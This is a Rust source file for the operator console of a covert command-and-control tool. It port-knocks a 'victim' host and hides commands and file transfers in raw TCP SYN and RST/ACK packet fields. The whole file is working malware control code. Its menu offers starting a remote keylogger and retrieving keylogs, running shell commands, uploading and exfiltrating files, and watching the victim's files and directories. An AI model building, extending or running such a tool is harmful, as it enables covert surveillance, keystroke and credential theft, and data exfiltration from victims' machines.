use std::io::{self, Write};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::fs;
use pnet::transport::{transport_channel, TransportChannelType::Layer3};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::Packet;
use pnet::datalink;

mod port_knkr;
mod keylogger;
mod covert;

use port_knkr::KnockSession;

// ============================================================================
// DEBUG CONFIGURATION
// ============================================================================
const DEBUG: bool = true;

macro_rules! debug {
    ($($arg:tt)*) => {
        if DEBUG {
            let ts = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_millis();
            eprintln!("[DEBUG {:.3}s] {}", ts as f64 / 1000.0, format!($($arg)*));
        }
    };
}

// Command Codes
const CMD_START_LOGGER:     u8 = 0x10;
const CMD_STOP_LOGGER:      u8 = 0x20;
const CMD_UNINSTALL:        u8 = 0x30;
const CMD_REQUEST_KEYLOG:   u8 = 0x50;
const CMD_UPLOAD_FILE:      u8 = 0x60;
const CMD_DOWNLOAD_FILE:    u8 = 0x70;
const CMD_WATCH_FILE:       u8 = 0x80;
const CMD_WATCH_DIR:        u8 = 0x90;
const CMD_STOP_WATCH:       u8 = 0x91;

// File Transfer Metadata
const CHUNK_SIZE: usize = 28; // 4 chars × 7 bits per covert chunk

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    running: Arc<AtomicBool>,
    tx_port: u16,
    rx_port: u16,
}

impl Commander {
    fn new() -> Self {
        debug!("Commander::new() initialized");
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            running: Arc::new(AtomicBool::new(false)),
            tx_port: 0,
            rx_port: 0,
        }
    }

    /// Send covert data via TCP SYN packets, receive ACK via RST/ACK
    fn send_covert_data(&self, payload: &[u8]) -> Result<(), String> {
        let victim_ip = self.victim_ip.ok_or("No victim IP")?;
        let local_ip = self.local_ip.ok_or("No local IP")?;
        
        debug!("send_covert_data: victim={}, local={}, payload_len={}", 
               victim_ip, local_ip, payload.len());
        
        let mut state = covert::SenderState::new_from_bytes(payload);
        let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
        let (mut tx, mut rx) = transport_channel(65535, protocol)
            .map_err(|e| { debug!("transport_channel error: {}", e); e.to_string() })?;
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
        let mut chunk_idx = 0;

        while state.has_next() && self.running.load(Ordering::SeqCst) {
            if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
                debug!("chunk #{}: ip_id=0x{:04x}, raw=0x{:08x}, masked_seq=0x{:08x}", 
                       chunk_idx, ip_id, raw_word, masked_seq);
                
                let mut acked = false;
                let mut attempts = 0;

                while !acked && attempts < 5 {
                    attempts += 1;
                    debug!("  attempt {}/5 for chunk #{}", attempts, chunk_idx);
                    
                    let pkt = covert::build_syn_packet(
                        local_ip,
                        victim_ip,
                        self.rx_port,
                        self.tx_port,
                        ip_id,
                        masked_seq,
                    );
                    
                    match tx.send_to(
                        pnet::packet::ipv4::Ipv4Packet::new(&pkt).unwrap(),
                        IpAddr::V4(victim_ip)
                    ) {
                        Ok(n) => debug!("  sent {} bytes via raw socket", n),
                        Err(e) => { debug!("  send_to error: {}", e); }
                    }

                    let start = Instant::now();
                    while start.elapsed() < Duration::from_millis(800) {
                        if let Ok((packet, _)) = rx_iter.next() {
                            debug!("  received packet from {}", packet.get_source());
                            if packet.get_source() == IpAddr::V4(victim_ip) {
                                if let Some(recv_sig) = covert::parse_rst_ack_signature(packet.packet()) {
                                    let expected_sig = covert::signature_ip_id(ip_id, raw_word);
                                    debug!("  RST/ACK sig: recv=0x{:04x}, expected=0x{:04x}", 
                                           recv_sig, expected_sig);
                                    if recv_sig == expected_sig {
                                        debug!("  ✓ ACK verified for chunk #{}", chunk_idx);
                                        state.ack();
                                        acked = true;
                                        break;
                                    } else {
                                        debug!("  ✗ sig mismatch, retrying...");
                                    }
                                }
                            }
                        }
                    }
                }
                
                if !acked { 
                    debug!("✗ Failed to send chunk #{} after 5 attempts", chunk_idx);
                    return Err(format!("Failed to send chunk after 5 attempts"));
                }
                chunk_idx += 1;
            }
        }
        debug!("send_covert_data: completed {} chunks", chunk_idx);
        Ok(())
    }

    /// Send file to victim in chunks with metadata header
    fn upload_file_to_victim(&self, local_path: &str, remote_path: &str) -> Result<(), String> {
        debug!("upload_file_to_victim: local={} -> remote={}", local_path, remote_path);
        println!("[*] Uploading {} -> {}:{}...", local_path, self.victim_ip.unwrap(), remote_path);
        
        let file_data = fs::read(local_path)
            .map_err(|e| { debug!("read file error: {}", e); format!("Failed to read file: {}", e) })?;
        debug!("file size: {} bytes", file_data.len());
        
        let remote_path_bytes = remote_path.as_bytes();
        let mut header = Vec::new();
        header.push(CMD_UPLOAD_FILE);
        header.push(remote_path_bytes.len() as u8);
        header.extend_from_slice(remote_path_bytes);
        
        debug!("sending metadata header: {:?}", header);
        self.send_covert_data(&header)?;
        println!("[+] Metadata sent");
        
        let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
        debug!("total data chunks: {}", total_chunks);
        
        for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
            print!("\r[*] Uploading chunk {}/{}...", i + 1, total_chunks);
            io::stdout().flush().unwrap();
            debug!("uploading chunk {}/{} ({} bytes)", i + 1, total_chunks, chunk.len());
            self.send_covert_data(chunk)?;
        }
        
        debug!("sending end marker [0xFF]");
        self.send_covert_data(&[0xFF])?;
        
        println!("\n[+] File upload complete!");
        debug!("upload_file_to_victim: finished");
        Ok(())
    }

    /// Request file from victim
    fn download_file_from_victim(&self, remote_path: &str, local_path: &str) -> Result<(), String> {
        debug!("download_file_from_victim: remote={} -> local={}", remote_path, local_path);
        println!("[*] Downloading {}:{} -> {}...", self.victim_ip.unwrap(), remote_path, local_path);
        
        let remote_path_bytes = remote_path.as_bytes();
        let mut request = Vec::new();
        request.push(CMD_DOWNLOAD_FILE);
        request.push(remote_path_bytes.len() as u8);
        request.extend_from_slice(remote_path_bytes);
        
        debug!("sending download request: {:?}", request);
        self.send_covert_data(&request)?;
        println!("[+] Download request sent");
        
        self.receive_file_from_victim(local_path)
    }

    /// Receive file data from victim (called after download request)
    fn receive_file_from_victim(&self, local_path: &str) -> Result<(), String> {
        let target_ip = self.victim_ip.unwrap();
        let local_ip = self.local_ip.unwrap();
        let rx_port = self.rx_port;
        let _tx_port = self.tx_port;
        let running = self.running.clone();
        
        debug!("receive_file_from_victim: target={}, rx_port={}, local_path={}", 
               target_ip, rx_port, local_path);
        
        let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
        let (mut tx, mut rx) = transport_channel(65535, protocol)
            .map_err(|e| { debug!("transport_channel error: {}", e); e.to_string() })?;
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
        let mut receiver_state = covert::ReceiverState::new();
        let mut file_data = Vec::new();
        let mut metadata_received = false;
        let mut expected_size: Option<usize> = None;

        println!("[*] Waiting for file data...");
        let start = Instant::now();
        let mut packets_seen = 0;
        
        while running.load(Ordering::SeqCst) && start.elapsed() < Duration::from_secs(60) {
            if let Ok((packet, _)) = rx_iter.next() {
                packets_seen += 1;
                if packets_seen % 10 == 0 {
                    debug!("listener: processed {} packets, elapsed={:?}", 
                           packets_seen, start.elapsed());
                }
                
                if packet.get_source() == IpAddr::V4(target_ip) {
                    if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
                        debug!("parsed SYN: src_port={}, dst_port={}, ip_id=0x{:04x}, seq=0x{:08x}",
                               parsed.src_port, parsed.dst_port, parsed.ip_id, parsed.seq);
                        
                        if parsed.dst_port == rx_port {
                            let unmasked = covert::unmask_word(parsed.seq, parsed.ip_id);
                            debug!("unmasked word: 0x{:08x}", unmasked);
                            
                            if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
                                debug!("apply_chunk: sig_id=0x{:04x}, buffer_len={}, complete={}", 
                                       sig_id, receiver_state.buffer.len(), receiver_state.complete);
                                
                                let ack_params = covert::RstAckParams {
                                    src_ip: local_ip,
                                    dst_ip: target_ip,
                                    src_port: rx_port,
                                    dst_port: parsed.src_port,
                                    ack_number: parsed.seq.wrapping_add(1),
                                    ip_id: sig_id,
                                };
                                let ack_pkt = covert::build_rst_ack_packet(&ack_params);
                                let _ = tx.send_to(
                                    pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt).unwrap(),
                                    IpAddr::V4(target_ip)
                                );

                                if receiver_state.complete {
                                    let chunk = receiver_state.buffer.clone();
                                    debug!("chunk complete: {} bytes, first_4={:02x?}", 
                                           chunk.len(), &chunk[..chunk.len().min(4).min(4)]);
                                    
                                    if chunk.len() == 1 && chunk[0] == 0xFF {
                                        debug!("received end marker [0xFF], breaking");
                                        break;
                                    }
                                    
                                    if !metadata_received {
                                        if chunk.len() >= 4 {
                                            expected_size = Some(u32::from_be_bytes([chunk[0], chunk[1], chunk[2], chunk[3]]) as usize);
                                            file_data.extend_from_slice(&chunk[4..]);
                                            metadata_received = true;
                                            println!("[+] Expected size: {} bytes", expected_size.unwrap());
                                            debug!("metadata parsed: expected_size={}", expected_size.unwrap());
                                        }
                                    } else {
                                        file_data.extend_from_slice(&chunk);
                                        debug!("appended {} bytes to file_data (total: {})", 
                                               chunk.len(), file_data.len());
                                    }
                                    
                                    receiver_state = covert::ReceiverState::new();
                                    
                                    if let Some(size) = expected_size {
                                        if file_data.len() >= size {
                                            debug!("collected all expected data ({} >= {}), breaking", 
                                                   file_data.len(), size);
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        debug!("receive loop ended: packets_seen={}, file_data_len={}, elapsed={:?}", 
               packets_seen, file_data.len(), start.elapsed());
        
        fs::write(local_path, &file_data)
            .map_err(|e| { debug!("write file error: {}", e); format!("Failed to write file: {}", e) })?;
        
        println!("[+] File download complete! Saved to {}", local_path);
        debug!("receive_file_from_victim: finished");
        Ok(())
    }

    /// Start watching a file on victim
    fn watch_file_on_victim(&self, remote_path: &str) -> Result<(), String> {
        debug!("watch_file_on_victim: path={}", remote_path);
        println!("[*] Watching file: {}:{}...", self.victim_ip.unwrap(), remote_path);
        
        let mut request = Vec::new();
        request.push(CMD_WATCH_FILE);
        request.push(remote_path.as_bytes().len() as u8);
        request.extend_from_slice(remote_path.as_bytes());
        
        debug!("sending watch request: {:?}", request);
        self.send_covert_data(&request)?;
        println!("[+] Watch request sent. Updates will appear below:");
        Ok(())
    }

    /// Start watching a directory on victim
    fn watch_directory_on_victim(&self, remote_path: &str) -> Result<(), String> {
        debug!("watch_directory_on_victim: path={}", remote_path);
        println!("[*] Watching directory: {}:{}...", self.victim_ip.unwrap(), remote_path);
        
        let mut request = Vec::new();
        request.push(CMD_WATCH_DIR);
        request.push(remote_path.as_bytes().len() as u8);
        request.extend_from_slice(remote_path.as_bytes());
        
        debug!("sending watch dir request: {:?}", request);
        self.send_covert_data(&request)?;
        println!("[+] Watch request sent. Updates will appear below:");
        Ok(())
    }

    /// Stop watching on victim
    fn stop_watch_on_victim(&self) -> Result<(), String> {
        debug!("stop_watch_on_victim");
        println!("[*] Stopping file watch...");
        self.send_covert_data(&[CMD_STOP_WATCH])?;
        println!("[+] Watch stopped");
        Ok(())
    }

    fn spawn_listener(&self) {
        let running = self.running.clone();
        let target_ip = self.victim_ip.unwrap();
        let local_ip = self.local_ip.unwrap();
        let rx_port = self.rx_port;
        let _tx_port = self.tx_port;

        debug!("spawn_listener: target={}, rx_port={}", target_ip, rx_port);
        
        thread::spawn(move || {
            debug!("listener thread started");
            let protocol = Layer3(IpNextHeaderProtocols::Ipv4);
            let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
            let mut receiver_state = covert::ReceiverState::new();
            let mut msg_count = 0;

            while running.load(Ordering::SeqCst) {
                if let Ok((packet, _)) = rx_iter.next() {
                    if packet.get_source() == IpAddr::V4(target_ip) {
                        if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
                            if parsed.dst_port == rx_port {
                                let unmasked = covert::unmask_word(parsed.seq, parsed.ip_id);
                                
                                if let Ok((_action, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, unmasked) {
                                    let ack_params = covert::RstAckParams {
                                        src_ip: local_ip,
                                        dst_ip: target_ip,
                                        src_port: rx_port,
                                        dst_port: parsed.src_port,
                                        ack_number: parsed.seq.wrapping_add(1),
                                        ip_id: sig_id,
                                    };
                                    let ack_pkt = covert::build_rst_ack_packet(&ack_params);
                                    let _ = tx.send_to(
                                        pnet::packet::ipv4::Ipv4Packet::new(&ack_pkt).unwrap(),
                                        IpAddr::V4(target_ip)
                                    );

                                    if receiver_state.complete {
                                        if let Ok(msg) = receiver_state.message_str() {
                                            msg_count += 1;
                                            debug!("listener: received message #{}: {:?}", msg_count, msg);
                                            println!("\n[Incoming] {}", msg);
                                        }
                                        receiver_state = covert::ReceiverState::new();
                                    }
                                }
                            }
                        }
                    }
                }
            }
            debug!("listener thread exiting");
        });
    }

    pub fn run(&mut self) {
        debug!("Commander::run() started");
        println!("=== Covert C2 Commander ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        debug!("disconnected_menu");
        println!("\n1) Initiate session (Port Knock)");
        println!("0) Exit");
        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => { debug!("user requested exit"); std::process::exit(0); }
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        debug!("connected_menu");
        println!("\n--- Connected to {:?} ---", self.victim_ip);
        println!("1) Start Keylogger");
        println!("2) Stop Keylogger");
        println!("3) Request Keylog File");
        println!("4) Run Shell Command");
        println!("5) Upload File to Victim");
        println!("6) Download File from Victim");
        println!("7) Watch File on Victim");
        println!("8) Watch Directory on Victim");
        println!("9) Stop Watching");
        println!("10) Uninstall");
        println!("11) Disconnect");
        match prompt("Selection > ").as_str() {
            "1" => self.start_keylogger(),
            "2" => self.stop_keylogger(),
            "3" => self.request_keylog_file(),
            "4" => self.run_program(),
            "5" => self.upload_file(),
            "6" => self.download_file(),
            "7" => self.watch_file(),
            "8" => self.watch_directory(),
            "9" => self.stop_watch(),
            "10" => self.uninstall(),
            "11" => self.disconnect(),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        debug!("initiate_connection");
        let target_ip_str = prompt("Target IP [127.0.0.1]: ");
        let ip = target_ip_str.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
        debug!("parsed target IP: {}", ip);

        match port_knkr::port_knock(ip) {
            Ok(session) => {
                debug!("port_knock succeeded: tx_port={}, rx_port={}", session.tx_port, session.rx_port);
                self.victim_ip = Some(ip);
                self.tx_port = session.tx_port;
                self.rx_port = session.rx_port;
                self.knock_session = Some(session);
                
                if let Some((iface_name, local_v4)) = Self::find_interface_for_target(ip) {
                    debug!("found interface: {} with local IP {}", iface_name, local_v4);
                    self.local_ip = Some(local_v4);
                } else {
                    debug!("no matching interface found, using loopback");
                    self.local_ip = Some(Ipv4Addr::new(127, 0, 0, 1));
                }

                self.running.store(true, Ordering::SeqCst);
                self.state = SessionState::Connected;
                self.spawn_listener(); 
                println!("[+] Knock Active. Ports -> Target Listener (TX): {}, Local Listener (RX): {}", self.tx_port, self.rx_port);
                debug!("initiate_connection: state=Connected");
            }
            Err(e) => { debug!("port_knock failed: {}", e); println!("[!] Knock failed: {}", e); }
        }
    }

    fn find_interface_for_target(target: Ipv4Addr) -> Option<(String, Ipv4Addr)> {
        debug!("find_interface_for_target: looking for {}", target);
        let interfaces = datalink::interfaces();
        for iface in &interfaces {
            for ip_net in &iface.ips {
                if let IpAddr::V4(local_v4) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target)) || local_v4.is_loopback() {
                        debug!("matched interface: {} ({})", iface.name, local_v4);
                        return Some((iface.name.clone(), local_v4));
                    }
                }
            }
        }
        debug!("no matching interface found");
        None
    }

    fn start_keylogger(&mut self) { 
        debug!("start_keylogger");
        let _ = self.send_covert_data(&[CMD_START_LOGGER]); 
    }
    fn stop_keylogger(&mut self) { 
        debug!("stop_keylogger");
        let _ = self.send_covert_data(&[CMD_STOP_LOGGER]); 
    }
    fn request_keylog_file(&mut self) { 
        debug!("request_keylog_file");
        let _ = self.send_covert_data(&[CMD_REQUEST_KEYLOG]); 
    }
    
    fn run_program(&mut self) {
        let cmd = prompt("Command: ");
        if !cmd.is_empty() {
            debug!("run_program: cmd={:?}", cmd);
            let _ = self.send_covert_data(cmd.as_bytes());
            println!("[*] Command sent. Listening for response...");
        }
    }

    fn upload_file(&mut self) {
        let local_path = prompt("Local file path: ");
        let remote_path = prompt("Remote file path: ");
        if !local_path.is_empty() && !remote_path.is_empty() {
            debug!("upload_file: local={} remote={}", local_path, remote_path);
            match self.upload_file_to_victim(&local_path, &remote_path) {
                Ok(_) => println!("[+] Upload successful"),
                Err(e) => println!("[!] Upload failed: {}", e),
            }
        }
    }

    fn download_file(&mut self) {
        let remote_path = prompt("Remote file path: ");
        let local_path = prompt("Local save path: ");
        if !remote_path.is_empty() && !local_path.is_empty() {
            debug!("download_file: remote={} local={}", remote_path, local_path);
            match self.download_file_from_victim(&remote_path, &local_path) {
                Ok(_) => println!("[+] Download successful"),
                Err(e) => println!("[!] Download failed: {}", e),
            }
        }
    }

    fn watch_file(&mut self) {
        let remote_path = prompt("File path to watch: ");
        if !remote_path.is_empty() {
            debug!("watch_file: path={}", remote_path);
            match self.watch_file_on_victim(&remote_path) {
                Ok(_) => println!("[+] Watch started"),
                Err(e) => println!("[!] Watch failed: {}", e),
            }
        }
    }

    fn watch_directory(&mut self) {
        let remote_path = prompt("Directory path to watch: ");
        if !remote_path.is_empty() {
            debug!("watch_directory: path={}", remote_path);
            match self.watch_directory_on_victim(&remote_path) {
                Ok(_) => println!("[+] Watch started"),
                Err(e) => println!("[!] Watch failed: {}", e),
            }
        }
    }

    fn stop_watch(&mut self) {
        debug!("stop_watch");
        let _ = self.stop_watch_on_victim();
    }

    fn uninstall(&mut self) {
        debug!("uninstall");
        let _ = self.send_covert_data(&[CMD_UNINSTALL]);
        self.disconnect();
    }
    
    fn disconnect(&mut self) {
        debug!("disconnect");
        self.running.store(false, Ordering::SeqCst);
        if let Some(ref session) = self.knock_session { 
            debug!("stopping knock session");
            session.stop(); 
        }
        self.state = SessionState::Disconnected;
        debug!("state=Disconnected");
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    if DEBUG {
        eprintln!("[DEBUG] Commander starting with debug logging enabled");
    }
    let mut commander = Commander::new();
    commander.run();
}
